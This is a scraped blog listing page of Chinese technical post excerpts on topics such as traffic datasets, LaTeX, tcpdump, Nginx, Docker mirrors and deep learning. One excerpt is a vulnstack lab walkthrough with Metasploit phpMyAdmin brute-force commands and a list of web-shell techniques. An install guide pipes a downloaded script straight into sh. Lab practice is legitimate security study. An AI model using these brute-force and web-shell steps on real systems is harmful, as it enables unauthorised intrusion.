timestamp, sensor_1_flow, sensor_2_flow, sensor_3_flow 2022-01-01 00:00:00, 150, 200, 180 2022-01-01 00:15:00, 160, 210, 190 2022-01-01 00:30:00, 155, 205, 185 ... 在这个例子中，每一行代表一个时间点的交通流量观测，其中 timestamp 是时间戳，而 sensor_1_flow、sensor_2_flow 和 sensor_3_flow 分别表示三个传感器在该时间点上的交通流量。这种格式可用于训练和评估交通流量预测模型。实际METR-LA数据集可能包含更多的信息和特征。
以我所用的metr-la为例：
data = np.load("D\data\\val.npz") array_names = data.files print("Arrays in the file:", array_names) for array_name in array_names: print(f"array:{array_name}") print(data[array_name]) 输出结果：
Arrays in the file: ['x', 'y', 'x_offsets', 'y_offsets'] array:x [[[[62.42857143 0.24305556] [66.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5771ec73468945c8cfd9731894e878dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9c4287e8997225b1d3e547df8379deb/" rel="bookmark">
			Latex中解决宋体加粗后会自动变为黑体的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 问题描述 在latex中，当我们使用如下方式（或其它方式）对宋体文本进行加粗后，宋体文本会自动变为黑体。
\songti{测试文本1} \textbf{\songti{测试文本2}} 测试效果如下：
2. 解决方案 （1）在.tex文件开头处导入.cls文件（或已经导入了.cls文件）。
（2）在.cls文件中添加如下内容：
\newCJKfontfamily{\cusong}[AutoFakeBold={2.17}]{SimSun} （3）在.tex文件中使用如下方式加粗宋体文本：
\textbf{\cusong{测试文本3}} 最终效果如下：
3. 参考 LaTeX中宋体中文无法加粗的情况_latex 宋体加粗-CSDN博客
Latex排版小技巧0001：中文字体加粗_latex 中文加粗-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/808a01be0d0e13256f9de4bd02be525b/" rel="bookmark">
			linux之tcpdump命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常系统维护中，遇到需要抓包的需求，下面对linux环境使用tcpdump命令进行抓包进行分析记录。tcpdump命令可用抓取流动在网卡上的数据包。
1、tcpdump常用参数说明 -c : 抓包次数，达到指定次数后停止抓包-C : 文件大小，写入文件前判断文件是否超过了设置的大小，超过了则关闭当前文件，开启新文件-i : 指定监听的网络接口-nn : 不进行端口名称的转换-r : 从指定文件中读取包-s : 设置每个数据包的大小-t : 在输出的每一行不打印时间戳vv : 输出详细的报文信息-w : 保存到指定文件中而不是打印出来，如tcpdump -w /tmp/test.pcap 2、tcpdump支持的过滤方式 过滤项过滤项说明示例host、src host、dst host过滤主机tcpdump host 192.168.11.11port，src port，dst port过滤端口tcpdump port 9999ip，ip6，arp，tcp，udp，icmp过滤协议tcpdump udp 192.168.11.11and，or，not逻辑表达式tcpdump host 192.168.11.11 and port 9999 3、实例 从所有网卡获取数据包
tcpdump -i any获取指定网卡的数据包
tcpdump -i eth0抓取包含指定ip的数据包
tcpdump host 192.168.11.11获取指定网卡和地址的数据包，并写入文件
tcpdump -i eth0 host 192.168.11.11 -w testfile.cap指定：网卡、源IP、目的IP，并写入文件
tcpdump -i eth0 src host 192.168.11.21 and dst host 192.168.11.11 -w testfile.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/808a01be0d0e13256f9de4bd02be525b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87272adc4bf5c311f2d6693e92caf1fa/" rel="bookmark">
			【ElementUI】一行代码解决图片预览
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 【ElementUI】一行代码解决图片预览 只需要在图片标签上加入`:preview-src-list` 只需要在图片标签上加入:preview-src-list 完整代码如下：
&lt;el-table-column label="封面" align="center" prop="cover" :sort-orders="['descending','ascending']" sortable="custom"&gt; &lt;template slot-scope="scope"&gt; &lt;el-image v-if="scope.row.cover" style=" height: 50px" :src="scope.row.cover" :preview-src-list="[scope.row.cover]" &gt; &lt;/el-image&gt; &lt;/template&gt; &lt;/el-table-column&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90d21a7ce21cae8ebf2b787862cc395d/" rel="bookmark">
			奥本海默-电影剧情简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		片头，奥本海默 脑海浮现恒星生命周期画面
1925年，奥本海默离开美国去欧洲学习新物理（量子力学）
脑海浮现量子力学相关画面（像 德布罗意波）
1927年从德国哥廷根大学毕业，获得物理学博士学位。
接下两年先后在瑞士 苏黎世 和荷兰莱登 研究，之后准备回国发展美国的量子力学
1929年回美国任教；画面切到加州大学放射实验室，与欧内斯特·劳伦斯会面；
奥本海默倾向于理论，劳伦斯博士倾向于对理论进行实验
奥本海默曾在课上谈论政治，劳伦斯前来忠告
某晚会，奥本海默想要寄钱去西班牙帮助朋友移民，需要透过美共渠道，从而认识美共
1938年 哈恩和F.施特拉斯曼 用中子轰击铀核发现核裂变同时释放出能量
1939年，他和学生哈特兰·史奈德发表《论持续不停的引力相吸》预测了黑洞的存在，但同年德国入侵波兰，头条被盖
之后认识了生物学家并结婚生子，和前女友告别
1941年珍珠港事件后，美对日、德宣战。
德国开展原子弹研制，爱因斯坦等科学家寄信 罗斯福，建议美国跟上。
1942年奥本海默加入了研制原子弹的“曼哈顿计划”。
“曼哈顿计划”军方主管 格罗夫斯 找奥本海默交谈
奥本海默答：
1、德国领先美国18个月的原子弹进度，海森堡 是犹太人，可利用希特勒的反犹太主义来减缓其进度。
2、权限划分会 降低泄密风险 但也会 降低效率，首要敌人是德国而不是俄国，因此要集中各地科学家来加速原子弹研制。
3、自己负责理论，劳伦斯负责放射实验，芝加哥冶金实验，建铁路连接各地资源，交汇点建立秘密实验基地，汇聚各地科学家。
4、要求基地的 教育娱乐等设施齐全，才能招募各地科学家，并携带家眷定居
5、基地选址洛斯阿拉莫斯
还没成为“美国氢弹之父”的 爱德华·泰勒 计算发现：
当中子撞击原子核后释放的中子持续撞击其它原子核，当数量高于临界时，裂变连锁反应就不会停止，从而引爆整个地球的大气层
幻想原子弹点燃大气层的画面
于是奥本海默去请教爱因斯坦，爱因斯坦建议找 汉斯·贝特 来计算。
后来计算结果是：原子弹不会引爆整个地球的大气层
1943年奥本海默携家小搬入 洛斯阿拉莫斯，并且不能离开
直到拿到安全许可证后才能出去，立马去找前女友
原子弹原是针对德国，但1945年4月希特勒自杀，预计德国即将投降，原子弹变得没必要。
奥本海默答：日本尚未投降，前线美军仍要持续战死，原子弹投放日本可提早结束战争，带来和平，减少伤亡
1945年轰炸东京并未能使日本投降，反而导致大量平民伤亡。
对此 奥本海默答：原子弹能真正威胁日本统治阶级，迫使其投降
1945年7月，原子弹试爆成功
原子弹送往前线，奥本海默忐忑“虽然我们制造出原子弹，但不能决定原子弹的使用”
因为 不能确定 原子弹给未来带来的是和平还是核战
1945年8月原子弹投放日本后，庆祝会上 奥本海默 并不开心，反而不安；
幻见 原子弹所致的 爆炸闪光、人皮裂开、脚踩 化烬黑尸…
与杜鲁门对话，奥本海默担心美苏核武军备竞赛，反对研制氢弹
1950年1月杜鲁门宣布研制氢弹（H-BOMB PROGRAM）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90d21a7ce21cae8ebf2b787862cc395d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c7acf1cc475a1d1d6306c7aa59c8203/" rel="bookmark">
			3.镜像加速器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
1 阿里云
2 网易云
从网络上拉取镜像的时候使用默认的源可能会慢，用国内的源会快一些
1 阿里云 访问 阿里云-计算，为了无法计算的价值 然后登录，登录后搜索 容器镜像服务
点击容器镜像服务
点击管理控制台
点击 镜像工具-&gt;镜像加速器
加速器地址每个人都不一样，配置镜像加速器的方式我们一条一条执行就行了，我们下面搞一下
输入 sudo mkdir -p /etc/docker 如果没有/etc/docker这个文件夹就创建一个，如果有就什么都不做
-p的意思是创建递归目录，如果你没有上一级就把上一级也创建了 之后输入 sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF' 我们需要给daemon.json写一点儿东西（如果没有daemon.json会自动创建一个）
EOF的意思是最后要以EOF结尾, 负号的意思是忽略制表符以及空格（在我当前系统的shell中写不写负号效果一样） 执行后会让你写一些东西，我们把要写的东西写上
输完大括号按回车，一行一行写，缩进无所谓 之后reload一下，然后再重启docker就行了
2 网易云 将 daemon.json 中的URL改为 http://hub-mirror.c.163.com
我没试过 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4ef9db792995a40b26781150d8e530f/" rel="bookmark">
			假设检验（四）（非参数假设检验）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 分布假设检验参考文献 在有些实际问题中，无法预知总体服从何种分布，而希望根据样本来检验对总体分布所提出的假设，或者想通过样本来检验对总体之间的关系所提出的假设。这一类问题就是非参数假设检验问题。非参数假设检验包括分布假设检验、相同性检验和独立性检验等。这里主要介绍分布假设检验。
分布假设检验 分布假设检验问题可表述为：设 X 1 , . . . , X n X_1,...,X_n X1​,...,Xn​ 为总体 X X X 的样本，欲据此样本检验假设
H 0 : X 的分布函数 F = F 0 H_0:X\ 的分布函数\ F=F_0 H0​:X 的分布函数 F=F0​ 这里 F 0 F_0 F0​ 是一个已知的分布函数，通常称 F 0 F_0 F0​ 为理论分布。
检验假设 H 0 H_0 H0​ 的基本思想是用样本 X 1 , . . . , X n X_1,...,X_n X1​,...,Xn​ 去拟合 F 0 F_0 F0​。根据拟合的优良程度来推断假设 H 0 H_0 H0​ 成立与否。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4ef9db792995a40b26781150d8e530f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0370345e4fecdb9f742bd323ba9eed0a/" rel="bookmark">
			java 动态代理以及自定义注解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; // 定义一个自定义注解 @Retention(RetentionPolicy.RUNTIME) @interface MyAnnotation { String value(); } // 定义一个接口 interface MyInterface { @MyAnnotation("Hello from annotation") void doSomething(); } // 实现 InvocationHandler 接口，用于处理代理对象的方法调用 class MyInvocationHandler implements InvocationHandler { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // 获取方法上的注解 MyAnnotation annotation = method.getAnnotation(MyAnnotation.class); if (annotation != null) { System.out.println("Annotation value: " + annotation.value()); } else { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0370345e4fecdb9f742bd323ba9eed0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1298ae5143941d6c7b4311116c68451/" rel="bookmark">
			Ubuntu20.04/Linux中常用软件的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、安裝与卸载微信二、安裝与卸载QQ三、安装Chrome浏览器并加入apt更新四、安裝VScode4.1 安装常用插件4.2 减小Ipch缓存： 五、安装代码对比工具Meld六、安裝WPS七、安装PDF阅读器Foxit Reader八、安装文献管理软件Zotero九、安装有道云笔记十、安装远程控制软件ToDesk十一、安装远程控制软件Nomachine十二、安装画图软件Kolourpaintr和录屏软件Kazam十三、安裝视频播放器smplayer十四、安装Github桌面版 在安装了Ubuntu20.04系统之后，安装Windows常用的软件或者类似的替代软件，方便我自己重裝系統之後快速使用
一、安裝与卸载微信 deepin是国产的linux系统，支持qq、微信等众多windows软件。在ubuntu上添加deepin的环境就可以安装和使用qq和微信了(QQ界面有点拉，这里还是不要装了，下面有更好的)
（1）添加仓库：
wget -O- https://deepin-wine.i-m.dev/setup.sh | sh （2）安装微信
sudo apt install com.qq.weixin.deepin （3）卸载微信，如果要卸载dpkg安装的应用，通过sudo dpkg -l查看dpkg安装的软件，并找到自己的安装的软件名，可以通过grep进行字符过滤
dpkg -l | grep weixin sudo apt-get remove com.qq.weixin.deepin:i386 dpkg -l | grep weixin搜不到就换成dpkg -l | grep wechat
删除WeChat 自动生成的记录文档
cd Documents sudo rm -r WeChat\ Files （4）卸载wine
dpkg -l | grep wine sudo apt remove deepin-wine-helper:i386 deepin-wine6-stable deepin-wine6-stable-amd64 deepin-wine6-stable-i386:i386 二、安裝与卸载QQ 最近发现官方更新了Linux版QQ，界面相比之前有质的飞跃，推荐安装，直接去官网下载安装包：https://im.qq.com/linuxqq/index.shtml，然后安装：
sudo dpkg -i linuxqq_3.1.1-11223_amd64.deb 卸载通过sudo dpkg -l查找：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1298ae5143941d6c7b4311116c68451/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c76feee22e4fde54a992684aa54f9b6d/" rel="bookmark">
			Latex分点介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章中如何形成小黑点来分点（记录写论文中一些问题）
The test \begin{itemize} \item A \item B \item C \end{itemize} The test 效果图如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0182d73d7c8aba7fa5626ffd3e5da6d8/" rel="bookmark">
			红日安全 vulnstack (一)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		仅供安全研究，切勿违法犯罪。
大家好，这段时间在玩红日安全的靶场，这个靶场质量非常高，推荐大家玩一玩
红日安全网站http://vulnstack.qiyuanxuetang.net/ 这里我们打的靶场系列一
这边找到靶机
进去下载靶机
靶机登录密码一律为：hongrisec@2019
我这边下载下来一共是三个靶机 分别是win2003 win7（有phpstudy，内含web环境） win2008
这是靶机网络环境的拓步图
那么win7是通外网的，win2003和win2008是不通外网，但是与win7是互通的
那么我们简单配置一下网络（每块网卡位置要对应上，实践经验，） 如果先是nat在仅主机
那么它本身配的域控ipv4 全跑nat网了 它配的域控ipv4应该要在仅主机的那块网卡上 所以仅主机网卡要放在第一位
win7
win2003
win2008
我登录win2003 2008的时候还提示密码过期要修改
我改成了hongrisec@2020
仅主机模式网段是192.168.25.*
win7nat网ip是192.168.88.128
第一步我们信息整理一下 一方面是开放端口 一方面是目录扫描
密码爆破起来 msf（有时候它会误报，我们用它误报的去登录一下，跳转了，所以误报，把这个误报密码从字典拿出来即可）
search type:auxiliary login search type:auxiliary name:phpmyadmin login use 0 options set rhosts 192.168.88.128 set pass_file /home/yan8925298/1.txt set targeturi /phpMyAdmin/index.php set threads 2 run 然后我们总结一下phpadmingetshell的方法
1 直接把shell写进去 2 利用全局日志写shell 3 慢日志文件写 shell 4 使用错误日志getshell 5利用phpmyadmin4.8.x本地文件包含漏洞getsh 通过phpinfo 知道C:/phpStudy/WWW/phpinfo.php这是网站根目录
使用直接写shell
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0182d73d7c8aba7fa5626ffd3e5da6d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc677f48f423cb7d651a009db94e9a28/" rel="bookmark">
			HbuilderX下载插件失败，报插件下载失败，请检查网络是否正常！解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近钻研一下uni-app的项目，却发现HbuilderX在装插件这一步始终装不上去，在网络正常情况下，点击安装就是提示网络是否正常，安装成功之后但是插件还是显示未安装，卸载删除搞了很久都没有解决。
我的方案解决如下：
1.是用管理员去打开这个HbuilderX的软件
2.就是去检查npm的镜像源地址
3.不要用公司网络去装插件，可以使用手机热点去装
首先检查npm版本和node版本
npm --version
node --version 再检查npm的镜像源地址
npm config get registry
npm官方的镜像源地址是 http://www.npmjs.org
需要切换到淘宝镜像地址
npm config set registry http://registry.npm.taobao.org
就能安装成功了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b3f4f16092c0f617210e571b176f6d1/" rel="bookmark">
			hs_err_pid.log 分析工具 CrashAnalysis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GitHub - xpbob/CrashAnalysis
java -jar CrashAnalysis-1.0-SNAPSHOT.jar hs_err_pid1817966.log
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4725363a918ea131c732265488cb53b1/" rel="bookmark">
			gitlab 界面，提交历史后面出现流水线：已失败的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前天新建了 仓库，把代码推上去了，今天才注意到，提交说明后面有个红x，鼠标悬浮在上面，出现流水线：已失败的提示，这怎么解决呢。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa211f2add1089addf473340ca16dd3f/" rel="bookmark">
			Nginx报错 HTTP 413 Request Entity Too Large（Payload Too Large）解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因 上传文件时，请求参数过大，导致超出服务端限制。
客户端发送的实体主体部分比服务器能够或者希望处理的要大。 解决 Nginx默认最大能够上传1MB文件，打开nginx.conf在http{}中，找到server{}设置：
client_max_body_size 30m;（配置客户端请求实体最大值）
client_body_buffer_size 128k;（配置请求体缓存区大小）
client_max_body_size
client_max_body_size 默认 1M，表示 客户端请求服务器最大允许大小，在“Content-Length”请求头中指定。如果请求的正文数据大于client_max_body_size，HTTP协议会报错 413 Request Entity Too Large。如果需要上传大文件，一定要修改该值。
client_body_buffer_size
Nginx分配给请求数据的Buffer大小，如果请求的数据小于client_body_buffer_size直接将数据先在内存中存储。如果请求的值大于client_body_buffer_size小于client_max_body_size，就会将数据先存储到临时文件中，在哪个临时文件中呢？
client_body_temp 指定的路径中，默认该路径值是/tmp/.
所以配置的client_body_temp地址，一定让执行的Nginx的用户组有读写权限。否则，当传输的数据大于client_body_buffer_size，写进临时文件失败会报错。
如果追求效率，就设置 client_max_body_size，client_body_buffer_size相同的值，这样就不会存储临时文件，直接存储在内存了。
当请求为GET请求时，可以在nginx.conf的http{}中，找到server{}设置： client_header_buffer_size 2k;
large_client_header_buffers 4 16k;
具体大小根据实际情况而定，这里仅做示例
client_header_buffer_size
client_header_buffer_size 默认值：1k，这个指令表示客户端请求的http头部缓冲区大小。绝大多数情况，下一个头部请求的大小不会大于1k。不过如果有来自于wap客户端的较大的cookie它可能会大于1k，Nginx将分配给它一个更大的缓冲区，这个值可以在large_client_header_buffers里面设置。
large_client_header_buffers
默认值：large_client_header_buffers 4 4k，指令表示客户端请求的一些比较大的头文件到缓冲区的最大值。如果一个请求的URI大小超过这个值，服务器将返回一个"Request URI too large" (414)，同样如果一个请求的头部字段大于这个值，服务器将返回"Bad request"(400)。
缓冲区根据需求的不同是分开的。 默认一个缓冲区大小为操作系统中分页文件大小，通常是4k或8k，如果一个连接请求将状态转换为 keep-alive，这个缓冲区将被释放。
改完配置后，执行如下命令，热更新nginx配置:
nginx -s reload 总结 文件无法上传大概就有以下四个方面的原因： 服务器对上传文件带下做了限制（Nginx，Apache，IIS等服务器，文中仅对Nginx配置做了说明）
网关对上传文件大小做了限制，此时添加配置即可。
SpringBoot/Spring对上传文件大小做了限制，添加配置即可。
文件确实过大，前后端链接超时，自动断开链接，可自己设置断点续传。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fac54b709902afaf0e1c54b5cf52cd74/" rel="bookmark">
			uniapp自定义进度条组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目标效果
原型设计为这样的样式，但是现有的进度条组件样式都无法满足需求，于是编写组件实现。
设计引用格式为
&lt;zLineProgress :total="15" :val="7" title="你好吗" /&gt; 定义组件 &lt;template&gt; &lt;view style="height: 3.5rem; margin: 0 1em;"&gt; &lt;view class="line-total" :style="'width: ' + (val / total * 100) + '%'"&gt;{{val}}&lt;/view&gt; &lt;view style="position: relative;"&gt;	&lt;view class="line-base"&gt;&lt;/view&gt; &lt;view class="line-blue" :style="'width: ' + (val / total * 100) + '%'"&gt;&lt;/view&gt; &lt;/view&gt; &lt;view class="line-val"&gt; &lt;text&gt;{{title}}&lt;/text&gt; &lt;text&gt;{{total}}&lt;/text&gt; &lt;/view&gt; &lt;/view&gt; &lt;/template&gt; &lt;script&gt; export default { name: 'zLineProgress', data() { return { } }, props: { // 标题 title: { type: [String, Number], default: '' }, total: { type: [Number], default: 0 }, val: { type: [Number], default: 0 } }, computed: { }, methods: { } } &lt;/script&gt; &lt;style scoped&gt; .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fac54b709902afaf0e1c54b5cf52cd74/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd6b0abba272f93ef88d64b77cd1e56a/" rel="bookmark">
			bypy 百度网盘下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装bypy: pip install bypy --user
2.配置信息：bypy info
3.得到如下界面，点击连接后得到百度云盘登录信息，得到授权码；
4.返回控制台，输入授权码，回车，完成登录；
5.一些用法：
bypy list # 显示文档
bypy upload filename -v # 上传某文件，显示进度
bypy -c # 取消令牌文件，一段时间后需要重新授权
bypy downdir filename # 下载
bypy compare # 比较本地目录和网盘目录
https://blog.csdn.net/skyroach/article/details/106496959
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90bc679146003b570cfa09276511bf4c/" rel="bookmark">
			PHP开发者必备技能：简单实现表单生成器功能！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：
随着互联网的飞速发展，网页中表单的应用变得越来越普遍。表单通常用于收集用户输入的数据，而开发一个简单的表单生成器功能可以帮助我们快速构建各种类型的表单。本文将介绍如何使用PHP开发一个简单的表单生成器功能，并提供具体的代码示例。
一、准备工作：
在开始之前，我们需要确保本地环境已经安装好了PHP。可以在官方网站（http://www.php.net ） 上下载并安装最新版本的PHP。
二、创建表单生成器类：
首先，我们需要创建一个表单生成器类，定义一些基本的属性和方法。具体代码如下所示：
class FormBuilder { private $fields; public function __construct() { $this-&gt;fields = []; } public function addField($type, $name, $label) { $field = [ 'type' =&gt; $type, 'name' =&gt; $name, 'label' =&gt; $label ]; $this-&gt;fields[] = $field; } public function generateForm() { $form = ''; foreach ($this-&gt;fields as $field) { $form .= ''; $form .= '' . $field['label'] . ''; switch ($field['type']) { case 'text': $form .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90bc679146003b570cfa09276511bf4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4cf60ac31a0e348972f34e301f427d6/" rel="bookmark">
			语义分割网络FCN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		语义分割是一种像素级的分类，输出是与输入图像大小相同的分割图，输出图像的每个像素对应输入图像每个像素的类别，每一个像素点的灰度值都是代表当前像素点属于该类的概率。
语义分割任务需要解决的是如何把定位和分类这两个问题一起解决，毕竟语义分割就是进行逐个像素点的分类，就是把where和what结合在了一起。这时候就需要物体的一些细节特征。
在传统的CNN网络中，在最后的卷积层之后会连接上若干个全连接层，将卷积层产生的特征图（feature map）映射成为一个固定长度的特征向量。一般的CNN结构适用于图像级别的分类和回归任务，因为它们最后都期望得到输入图像的分类的概率，如ALexNet网络最后输出一个1000维的向量表示输入图像属于每一类的概率.
而FCN是对图像进行像素级的分类（也就是每个像素点都进行分类），从而解决了语义级别的图像分割问题。与经典CNN在卷积层使用全连接层得到固定长度的特征向量进行分类不同，FCN可以接受任意尺寸的输入图像，采用反卷积层对最后一个卷基层的特征图（feature map）进行上采样，使它恢复到输入图像相同的尺寸，从而可以对每一个像素都产生一个预测，同时保留了原始输入图像中的空间信息，上采样的特征图进行像素的分类。
可以看出，FCN在CNN的基础上将全连接层转换为卷积层可以使分类网输出热图。添加层和空间损失产生了端到端密集学习的高效机器。
——————————————————————————————————————————
传统的图像分类会用到全连接层，但是使用全连接层的话会破坏原有的空间信息，而且使得特征不再具备局部信息，这对于图像分割这种像素级别的预测任务来说，影响非常大。
在FCN出现之前，比较常见的做法是采用滑动窗口，每个窗口从原图像上采集一小块区域，也可以叫做patchwise，作为网络的输入。虽然这样会减少全连接层所带来的对空间信息的破坏，但是它有几个比较明显的缺陷：
它计算量非常大，因为一张图需要滑动次数非常多，这样一来，相邻patch之间重合的部分会重复计算；不同patch之间相互独立，没有利用到全局的空间信息；patch的设置对模型性能的影响很大，patch过小，则感受野太小，非常影响准确率，patch过大，则重复计算的区域就很多； FCN的思想 FCN将传统CNN中的全连接层去掉，取而代之的是转化为一个个的卷积层，这样可以保持空间的位置关系。如下图所示：
整体的网络结构分为两个部分：全卷积部分和反卷积部分，丢弃了全连接层，在保持了空间信息的同时，也可以接受任意尺寸的输入图像。其中全卷积部分借用了一些经典的CNN网络，如AlexNet，VGG等等，并把最后的全连接层换成卷积，用于提取特征，形成热点图；而反卷积部分则是将小尺寸的热点图上采样得到原尺寸的语义分割图像。
输入图像经过卷积和池化之后，得到的特征图的宽高相对原图缩小了好几倍，所产生图叫做heatmap----热图，热图就是我们最重要的高维特征图图，得到高维特征之后就是最重要的一步也是最后的一步对原图像进行upsampling，也就是上采样，将图像进行放大直到到原图像的大小。
其实FCN的根本在于丢掉全连接层，保留了原本的空间信息，然后利用跳跃连接来融合特征，将定位较准的浅层信息和分类较准的深层信息结合起来。
最后的输出是类别数大小的heatmap，经过上采样恢复为原图大小的图片，为了对每个像素进行分类预测，这样才能形成最后已经进行语义分割的图像。所以在最后通过逐个像素地求其在1000张图像该像素位置的最大概率作为该像素的分类。
算法细节 FCN上采样使用的是反卷积，也叫转置卷积，文章采用了好几种上采样的结果。为了得到更好的分割效果，论文提出几种方式FCN-32s、FCN-16s、FCN-8s，如下图所示：
网络对原图像进行第一次卷积与下采样后原图像缩小为1/2；之后对图像进行第二次卷积与下采样后图像缩小为1/4；重复上面过程，接着继续对图像进行第三次相同的操作，图像缩小为原图像的1/8，此时保留这个阶段的特征图；同样，在第四次后得到为原图像的1/16的特征图并保留；最后对图像进行第五次操作，缩小为原图像的1/32，然后把原来CNN操作中的全连接变成两次卷积操作，也就是conv6、conv7，但此时图像的大小还是为原图的1/32，最后生成的可以叫做heatmap了，也就是我们最终想要的结果。 最后我们可以得到1/32尺寸的heatmap，1/16尺寸的featuremap和1/8尺寸的featuremap，将1/32尺寸的heatmap进行上采样到原始尺寸，这种模型叫做FCN-32s。这种简单粗暴的方法还原了conv5中的特征，但是其中一些细节是无法恢复的，所以FCN-32s精度很差，不能够很好地还原图像原来的特征。
基于上述原因，所以自然而然的就想到将浅层网络提取的特征和深层特征相融合，这样或许能够更好地恢复其中的细节信息。于是FCN把conv4中的特征对conv7进行2倍上采样之后的特征图进行融合，然后这时候特征图的尺寸为原始图像的1/16，所以再上采样16倍就可以得到原始图像大小的特征图，这种模型叫做FCN-16s。
为了进一步恢复特征细节信息，就重复以上操作。于是乎就把pool3后的特征图对conv7上采样4倍后的特征图和对pool4进行上采样2倍的特征图进行融合，此时的特征图的大小为原始图像的1/8。融合之后再上采样8倍，就可以得到原始图像大小的特征图了，这种模型叫做FCN-8s。
代码实现 backbone部分 class VGG(nn.Module): def __init__(self, pretrained=True): super(VGG, self).__init__() ​ # conv1 1/2 self.conv1_1 = nn.Conv2d(3, 64, kernel_size=3, padding=1) self.relu1_1 = nn.ReLU(inplace=True) self.conv1_2 = nn.Conv2d(64, 64, kernel_size=3, padding=1) self.relu1_2 = nn.ReLU(inplace=True) self.pool1 = nn.MaxPool2d(kernel_size=2, stride=2) ​ # conv2 1/4 self.conv2_1 = nn.Conv2d(64, 128, kernel_size=3, padding=1) self.relu2_1 = nn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4cf60ac31a0e348972f34e301f427d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfae0945b758eec611e7ac000d825b3a/" rel="bookmark">
			minigpt4安装的一系列问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题一 合并权重：
python -m fastchat.model.apply_delta --base /data/qq/llama2-7b-chat-hf --target /data/qq/MiniGPT-4/vicuna_weights/ --delta /data/qq/vicuna-7b-delta-v0 fastchat版本与模型版本 不兼容
解决方法：
第一种：用低版本fastchat
第二种：vicuna别用v0
问题二 HFValidationError: Repo id must use alphanumeric chars or '-', '_', '.', '--' and '..' are forbidden, '-' and '.' cannot start or end the name, max length is 96: ''. 把模型权重路径中用’-'的全改了。
问题三 在web端测试时出现胡言乱语的情况
原因是：minigpt4/configs/models/minigpt4.yaml文件时，误将llama_model指向了vicuna的delta文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
